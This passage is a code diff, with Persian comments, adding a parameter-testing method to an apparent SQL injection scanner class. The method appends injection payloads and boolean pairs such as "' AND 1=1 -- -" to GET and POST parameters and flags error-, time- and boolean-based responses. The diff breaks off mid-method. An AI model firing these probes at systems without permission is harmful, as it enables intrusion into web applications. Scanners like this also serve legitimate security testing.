@@ -157,3 +157,63 @@ class SQLInjectionTester:
             return False
         # مقایسه محتوای پاسخ‌ها (می‌تواند پیچیده‌تر شود)
         return response1.text != response2.text or response1.status_code != response2.status_code
+
+
+    ##########################################################################################################
+
+
+    def test_parameter(self, parameter_name, original_params=None, original_data=None):
+        print(f"[تست] پارامتر: {parameter_name}")
+        is_vulnerable = False
+
+        for payload in self.payloads:
+            print(f"  [Payload] {payload[:50]}...") # نمایش خلاصه Payload
+
+            # تست برای متد GET
+            if self.method == "GET" and original_params is not None:
+                test_params = original_params.copy()
+                test_params[parameter_name] += payload
+                start_time = time.time()
+                response = self.send_request(params=test_params)
+                end_time = time.time()
+
+                is_error, error_keyword = self.analyze_response(response)
+                if is_error:
+                    print(f"    [!] آسیب‌پذیری احتمالی (خطا): با Payload: {payload}")
+                    is_vulnerable = True
+                    if parameter_name not in self.vulnerabilities:
+                        self.vulnerabilities[parameter_name] = []
+                    self.vulnerabilities[parameter_name].append({"type": "Error-based", "payload": payload, "error": error_keyword})
+                elif self.analyze_response_time(response, end_time - start_time - self.delay):
+                    print(f"    [!] آسیب‌پذیری احتمالی (مبتنی بر زمان): با Payload: {payload}")
+                    is_vulnerable = True
+                    if parameter_name not in self.vulnerabilities:
+                        self.vulnerabilities[parameter_name] = []
+                    self.vulnerabilities[parameter_name].append({"type": "Time-based", "payload": payload, "error": None})
+
+                # تست Boolean-based (نیاز به دو درخواست با شرایط مختلف)
+                test_params_true = original_params.copy()
+                test_params_true[parameter_name] += "' AND 1=1 -- -" + payload
+                response_true = self.send_request(params=test_params_true)
+
+                test_params_false = original_params.copy()
+                test_params_false[parameter_name] += "' AND 1=2 -- -" + payload
+                response_false = self.send_request(params=test_params_false)
+
+                if self.analyze_response_boolean(response_true, response_false):
+                    print(f"    [!] آسیب‌پذیری احتمالی (Boolean-based): با Payload: {payload}")
+                    is_vulnerable = True
+                    if parameter_name not in self.vulnerabilities:
+                        self.vulnerabilities[parameter_name] = []
+                    self.vulnerabilities[parameter_name].append({"type": "Boolean-based", "payload": payload, "error": None})
+
+            # تست برای متد POST
+            elif self.method == "POST" and original_data is not None:
+                test_data = original_data.copy()
+                if isinstance(test_data, dict):
+                    test_data[parameter_name] += payload
+                else: # اگر داده string باشد (مثلاً application/x-www-form-urlencoded)
+                    parsed_data = parse_qs(test_data)
+                    if parameter_name in parsed_data:
+                        parsed_data[parameter_name][0] += payload
+                    test_data = urlencode(parsed_data, doseq=True)
